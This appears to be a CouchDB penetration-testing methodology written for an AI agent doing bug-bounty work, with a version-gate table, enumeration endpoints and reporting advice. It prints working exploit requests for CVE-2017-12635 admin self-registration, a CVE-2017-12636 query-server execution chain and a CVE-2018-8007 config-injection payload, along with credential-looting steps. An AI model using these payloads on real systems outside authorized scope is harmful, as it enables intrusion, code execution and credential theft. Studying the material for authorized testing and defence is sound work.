---
technology: "CouchDB"
kind: bug-bounty-methodology
audience: ai-agent
family: databases
version: "1.1"
last-refresh: "2026-11-19"
source: "corpus-SILENT after strict re-gate (0 writeups — estimated matches were substring noise; adjudication in internal coverage ledger) + upstream-verified (docs.couchdb.org official CVE pages 2017-12635 & 2017-12636, CouchDB 3.5 docs: security intro + server API, discoverer writeup justi.cz 2017-11-14) + rewritten from HackTricks (src/network-services-pentesting/5984-pentesting-couchdb.md), CC BY-NC 4.0, accessed 2026-11-13 (CVE-2018-8007 re-verified against NVD; nmap NSE + metasploit module + API endpoints re-verified against nmap nsedoc / module source / official API docs); v1.1 supplement: AI senior-reviewer pass (GPT-6.1 Sol via M365 Copilot) + dual fact-check (agent-side and reviewer-side web verification against docs.couchdb.org, couchdb blog, NVD, oss-security)"
provenance: "hybrid: corpus-grounded (5 ledger rows, internal coverage ledger) + HackTricks enrichment 2026-11-13; credit in source line. v1.1 supplement 2026-11-19 (model gpt-6.1-sol via M365 Copilot senior-review pass; all claims dual-verified against docs.couchdb.org release notes/CVE pages, blog.couchdb.org, NVD, oss-security 2026-10-20 posting): version-gate table replaces version-banner reasoning (1.7.0/2.1.1 first-fixed boundary nuance recorded; CVE-2022-24706 through 3.2.1; three 2026 CVEs ≤3.5.2 fixed in 3.5.3), 1.x-vs-2.x config route matrix, /_session identity verification before Admin Party claims, PBKDF2 1.3.0 correction, exploit-primitive gating (duplicate-key payload handling, query-server staging steps), prefixed-system-database attack surface (CVE-2026-90800), object-form replication credential disclosure (CVE-2026-107755), weatherreport admin→OS-user RCE (CVE-2026-86471), junior-pitfall table, severity rubric."
---

# CouchDB bug-bounty methodology

Companion overview: [[couchdb]].

Scope note: no observed engagement attacks CouchDB (the "5984" matches were hex fragments, line numbers, file sizes). Every command below is derived from the official API docs and the CVE discoverers' own publications — treat as upstream-verified, not observed-in-the-wild. A version banner is a *lead*, never proof: every chain below has per-primitive gates that must be validated independently.

Version gate (read first):

| Fact (verified against upstream) | Consequence for the hunt |
| --- | --- |
| CVE-2017-12635/12636 first fixed in **1.7.0 / 2.1.1** (release notes + NVD: "before 1.7.0 and 2.x before 2.1.1"); Apache advisories recommend 1.7.1/2.1.1 | Treat `<1.7.0` and `2.0.0–2.1.0` as the unauth-chain band; 1.7.0/1.7.1 boundary is a recorded source discrepancy — when in doubt, test the primitive instead of arguing the banner |
| CVE-2022-24706 (default Erlang cookie → RCE) affects improperly secured installs through **3.2.1**; 3.2.2 refuses the former default cookie and rebinds ports | "3.x" does NOT mean safe: 3.0–3.2.1 with a default cookie is still the Erlang-node RCE — check epmd/4369 whenever 5984 is locked down |
| CVE-2026-86471 (**weatherreport**: unsanitised runtime config → shell commands as the OS user, server-admin prerequisite) — ≤3.5.2, fixed 3.5.3 (2026-10-12) | Fresh admin→RCE path on current-ish installs: any config-writing admin on ≤3.5.2 |
| CVE-2026-90800 (prefixed system dbs `_users*`/`_replicator*`: admin-only `_all_docs`/`_changes` restriction not enforced in chttpd) — ≤3.5.2, fixed 3.5.3 | Unauthenticated read of prefixed user/replicator databases on ≤3.5.2 — probe `_users_x/_all_docs` style names wherever multi-tenant prefixes exist |
| CVE-2026-107755 (object-form replication URLs: credentials not redacted for non-owner readers) — ≤3.5.2, fixed 3.5.3 | Authenticated user reads *other users'* replication credentials — loot primitive on any ≤3.5.2 with replications |
| Since 3.0.0: admin account required at *startup*; `/_all_dbs` admin-only; new dbs default admin-only; node-local port 5986 **removed** (moved under 5984 `/_node/...`) | A 3.x in Admin Party is a misconfigured/legacy upgrade, not a stock install. Port 5986 is a 2.x-only discovery signal. A denied `/_all_dbs` proves nothing about a *known* db name |

## Phase 0 — Recon

```
5984/tcp open  http    CouchDB httpd (Erlang OTP)
nmap -sV -p 5984,5986,4369 198.51.100.x     # 5986 = 2.x-only node-local; 4369 = epmd (Erlang branch)
```

Fingerprint and version-gate in one request:

```bash
curl -s http://198.51.100.x:5984/
# {"couchdb":"Welcome","version":"2.1.0","vendor":{"name":"The Apache Software Foundation"}}
```

Version decision: `1.x < 1.7.0` or `2.0.0–2.1.0` → the unauthenticated 12635→12636 chain is *potentially* live (validate each primitive — Phase 3). `≤3.2.1` → Erlang-cookie branch (tool map). `≤3.5.2` → the three 2026 CVEs above are live primitives to test. Current stable is 3.5.3 (Erlang/OTP 27 minimum) — anything older has a dated, citable reason to be interesting.

Record the identity context before any conclusion: `GET /_session` returns `userCtx` — the effective identity for your requests. A proxy injecting auth, a remembered cookie, or an intermediary answering can fake "Admin Party"; verify what identity actually answered.

## Phase 1 — Anonymous enumeration

```bash
curl -s http://198.51.100.x:5984/_all_dbs          # admin-only since 3.0; open on party/1.x/2.x
curl -s http://198.51.100.x:5984/_uuids?count=1     # liveness
curl -s http://198.51.100.x:5984/_active_tasks      # admin-gated
curl -s http://198.51.100.x:5984/_node/_local/_config   # admin-gated config (2.x+ route; 1.x uses /_config)
```

`_all_dbs` discloses *names*, not read access — each db's authorization is separate (and since 3.0 a blocked listing says nothing about a known db name from scope or app traffic; `_global_changes` is optional and may not exist). Walk documents:

```bash
curl -s http://198.51.100.x:5984/<db>/_all_docs?include_docs=true
curl -s http://198.51.100.x:5984/_users/_all_docs?include_docs=true   # listing _users is admin-only; hash scheme below
```

Decision: `/_active_tasks` or config returning 200 *with `/_session` confirming `userCtx: null`* = **Admin Party** (no `[admins]` effective for your requests) → admin-gated primitives open directly. But Admin Party removes an *authentication* prerequisite only — it does not resurrect a patched execution primitive (12636/8007 fixes still apply per version).

Config route matrix (juniors break here): 1.x uses `/_config/...`; 2.x+ uses node-qualified `/_node/<node>/_config/...` (`_local` = the node that answered *this* request, not a stable cluster-wide target; get real node names from `/_membership`). A 404 from a wrong-generation route is not a patch result.

## Phase 2 — Credential attacks (when an admin exists)

- Try `admin:admin`, `admin:password`, `couchdb:couchdb` — the docs' own examples leak into real installs.
- `_users` password hashes: PBKDF2 since **1.3.0** (configurable work factor; older = weak scheme). Inspect the stored `password_scheme`/`iterations`/`derived_key`/`salt` fields rather than deriving from the banner. Server-admin credentials live in `[admins]` config, *not* `_users` — those are different populations.
- Basic auth is default but not universal — it can be removed from the authentication-handler chain (proxy auth, JWT, cookies). Establish the configured handlers first; since 3.4 a successful Basic auth also returns a session cookie (keep anonymous and authenticated testing separated).
- Per-db `_security` enumerates member/admin names; `validate_doc_update` functions carry additional write restrictions `_security` does not show.

## Phase 3 — CVE-2017-12635: unauthenticated admin self-registration (verified)

Mechanism (official advisory + discoverer Max Justicz): CouchDB validated `_users` writes with a **JavaScript** `validate_doc_update` (JSON parser keeps the *last* duplicate key) while Erlang-side authz (jiffy keeps *both*, getter returns the *first*) governed the new user's roles. Duplicate `"roles"` keys therefore show the validator an empty list while the Erlang side records `_admin`:

```bash
curl -X PUT 'http://198.51.100.x:5984/_users/org.couchdb.user:oops' \
  -H 'Content-Type: application/json' \
  --data-binary '{
    "type": "user",
    "name": "oops",
    "roles": ["_admin"],
    "roles": [],
    "password": "password"
  }'
# {"ok":true,...} — the write passes validation (JS sees roles: []),
# the stored/authorized context carries _admin (Erlang sees the first key)
```

Evidence discipline: send the payload raw — never round-trip it through a JSON tool that collapses duplicate keys. A successful PUT is *registration*, not yet *escalation*: prove effective authorization separately (read admin-gated config as the new user):

```bash
curl -u oops:password http://198.51.100.x:5984/_node/_local/_config   # now readable = escalation proven
```

The Fauxton GUI shows the account with *empty* roles (JS-parsed) — the escalation hides from casual inspection (discoverer's warning). Band: `<1.7.0` / `2.0.0–2.1.0` (see version gate for the 1.7.0/1.7.1 advisory discrepancy).

## Phase 4 — RCE paths for an admin

**CVE-2017-12636 (query servers)** — admins define query-server languages whose configured command runs when a view in that language executes (upstream: "a feature which is basically just a wrapper around execv"). Band: same as 12635. The command executes *on the CouchDB host as the CouchDB OS user* — staging is yours:

```bash
# 1. point a new "lang" at a process you placed on the host (placement is a separate primitive)
curl -X PUT http://198.51.100.x:5984/_node/_local/_config/query_servers/cmd \
  -u oops:password -d '"/tmp/p.sh"'
# 2. design doc with a NAMED view in that language (an empty views{} defines nothing to query)
curl -X PUT http://198.51.100.x:5984/<db>/_design/shell -u oops:password \
  -H 'Content-Type: application/json' -d '{"language":"cmd","views":{"v":{"map":"x"}}}'
# 3. QUERY the view — invocation is what executes the query server, not saving the design doc
curl -u oops:password 'http://198.51.100.x:5984/<db>/_design/shell/_view/v'
```

Separate the four gates in evidence: config accepted → design doc created → query-server invoked → execution observed. The metasploit `apache_couchdb_cmd_exec` module automates the full pair with its own staging; the excerpt flow above is the manual equivalent.

**CVE-2026-86471 (weatherreport) — the current admin→OS-user path.** ≤3.5.2: the `weatherreport` diagnostics module built shell commands from unsanitised *runtime configuration values* — a server admin who can write config through `/_node/_local/_config` gets arbitrary shell commands as the CouchDB OS user (CVSS 4.0: 9.3; fixed 3.5.3, which switched to `spawn_executable` with argument lists). From an offensive seat: on any ≤3.5.2 where you hold config-write, this is RCE — check any config value that flows into weatherreport's checks before inventing new ones.

**CVE-2018-8007 — config-API injection (fixed 1.7.2 / 2.1.2).** A config-writing admin escapes the config blacklist via newline injection — PUT a value whose payload opens a new INI section:

```bash
curl -X PUT 'http://198.51.100.x:5984/_node/couchdb@localhost/_config/cors/origins' \
  -u admin:example-password -H 'Content-Type: application/json' \
  -d '"example.com\n\n[os_daemons]\nreaper = /usr/local/bin/reap.sh"'
```

The injected `[os_daemons]` entry names a program spawned by the daemon (restarted on config change), so the write becomes execution as the CouchDB OS user once the cycle picks it up. Gates before reporting: config-write rights, persistence into the (writable) configuration chain — CouchDB reads an ordered chain of INI files, not literally only `local.ini`; read-only layouts block the disk-write half even when the API accepts the PUT. Exact payload/INI recipe is upstream-advisory-grounded but not lab-reproduced here — treat the *class* (config → section injection → os_daemons) as the technique and verify the instance.

**Post-fix admin surface** — config read alone still yields: `external` handlers, `os_process` settings, replication targets (server-side fetch = SSRF primitive to demonstrate, not assume — config *read* does not imply config *write*, and `config_whitelist` may restrict writes). Any admin on CouchDB is one config-write away from the classes above; hunt the instance's specific config.

## Phase 5 — Looting and escalation

- `/_node/_local/_config` full read: `[admins]` pbkdf2 hashes (`-pbkdf2-<hash>,<salt>,<iterations>`) crack offline; occasionally plaintext after a manual edit.
- `/_users/_all_docs` (admin): accounts + hashes. `_replicator` docs: source/target URLs with embedded credentials (`http://user:pass@internal-host:5984/db`) — internal-network recon gold.
- **CVE-2026-90800 (≤3.5.2): prefixed system databases** — `_users<suffix>`/`_replicator<suffix>` variants exist on multi-tenant setups with bespoke ACLs; the admin-only gate on `_all_docs`/`_changes` was not enforced for them, so *any* request could read full contents. Probe prefixed names wherever the deployment hints at them — this is unauthenticated loot on current-ish versions.
- **CVE-2026-107755 (≤3.5.2): object-form replication creds** — as any authenticated user, read replication docs whose source/target are URL *objects* (not strings): other users' credentials were not redacted. String-form URLs were redacted; the object form was the miss.
- `/_scheduler/jobs` / `/_scheduler/docs`: replication source/target per job — passwords are masked in current output; on ≤3.5.2 combine with 107755 instead.
- Per-db `_security` and `_design` docs: the app's authz model and view functions worth reading.

## Phase 6 — Reporting

Severity is a rubric (demonstrated access, privilege, scope, credential validity), not a fixed ladder — weak admin creds can be full admin compromise; "config access" on a config-writable ≤3.5.2 *is* the RCE. Report each primitive with its own proof: request bytes, effective identity (`/_session`), response, and observed effect. Remediation line for the report: current 3.5.3, admins with strong secrets, 5984/4369 not exposed, replication creds audited.

## Junior-tester pitfalls (top failure modes)

| Likely mistake | Consequence |
| --- | --- |
| Version banner read as confirmed RCE | Report dies in triage — each primitive has its own gates |
| Any anonymous 200 called "Admin Party" | Proxy auth/cookie/intermediary never excluded; wrong root cause |
| Stopping when `/_all_dbs` is 401 | Known db names from scope/app traffic never tested directly |
| 2.x `_node` route used against 1.x (or reverse) | 404 mistaken for "patched" |
| JSON tool "cleaning up" the 12635 payload | Duplicate keys collapsed — the exploit silently stops working |
| Saving a design doc and calling it execution | View never queried; query-server never invoked |
| DB-admin confused with server-admin | Config endpoints 403 misread as "not vulnerable" |
| Copying the 8007 INI payload into a read-only layout | API accepts, disk half fails, chain silently dead |
| Erlang RCE assumed from open 4369 alone | 4369 is the mapper; the distribution port + cookie state decide |

## Tool map (prose)

curl for the whole API (CouchDB is HTTP end to end); Fauxton (bundled `/_utils`) for interactive browsing; metasploit `apache_couchdb_cmd_exec` for the 12635+12636 chain and `apache_couchdb_erlang_rce` for the Erlang-cookie branch (CVE-2022-24706 band: ≤3.2.1; 3.2.2+ refuses the default cookie) — epmd/4369 first, then the actual distribution port; hashcat/john for pbkdf2 admin hashes; jq to slice the JSON. The tools vault holds per-tool notes.

## Supplement (2026-11-13): scanner coverage and enumeration endpoints

Rewritten from HackTricks (src/network-services-pentesting/5984-pentesting-couchdb.md), CC BY-NC 4.0, accessed 2026-11-13; CVE numbers and tool claims re-verified against primary sources before writing (scanner output is triage, not evidence — record tool version and routes).

```bash
nmap -sV --script couchdb-databases,couchdb-stats -p 5984 198.51.100.x
# metasploit: auxiliary/scanner/couchdb/couchdb_enum  (TARGETURI defaults to /_all_dbs)
```

Additional documented endpoints worth a GET (official API reference):

- `/_membership` — `cluster_nodes`/`all_nodes`: real node names for `_node/{node}` config routes.
- `/_scheduler/jobs`, `/_scheduler/docs` — replication jobs incl. source/target per job (passwords masked; ≤3.5.2 see CVE-2026-107755).
- `/_cluster_setup` — setup-wizard state; standalone vs cluster mid-setup.
- `/_node/_local/_stats`, `/_node/_local/_system` — statistics.
- `/_up` — liveness (404 when `maintenance_mode` true/nolb).
- `/_reshard` — resharding state. `/_db_updates` — db event feed (needs `_global_changes`).
- TLS twin: **6984** — scan alongside; Shodan `port:5984 couchdb` for external discovery.

## References (v1.1 verification trail)

- docs.couchdb.org CVE pages: 2026-86471, 2026-90800, 2026-107755, 2018-8007, 2020-1955 context; oss-security 2026-10-20 announcement (CVE-2026-86471, CVSS 4.0 9.3).
- docs.couchdb.org whatsnew: 3.0 (admin-at-startup, `_all_dbs` admin-only, secure new-db defaults, 5986 removed), 3.5 (3.5.3, 2026-10-12, Erlang/OTP 27 minimum, credential-stripping fixes), 1.3.0 (PBKDF2); blog.couchdb.org CVE-2018-8007 (fixed 1.7.2/2.1.2) and "Road to 3.0: Security".
- NVD CVE-2017-12635 ("before 1.7.0 and 2.x before 2.1.1") vs Apache advisory recommendation (1.7.1/2.1.1) — recorded discrepancy.
- CVE-2022-24706 band: ≤3.2.1 affected; 3.2.2 rejects default Erlang cookie (upstream release notes).
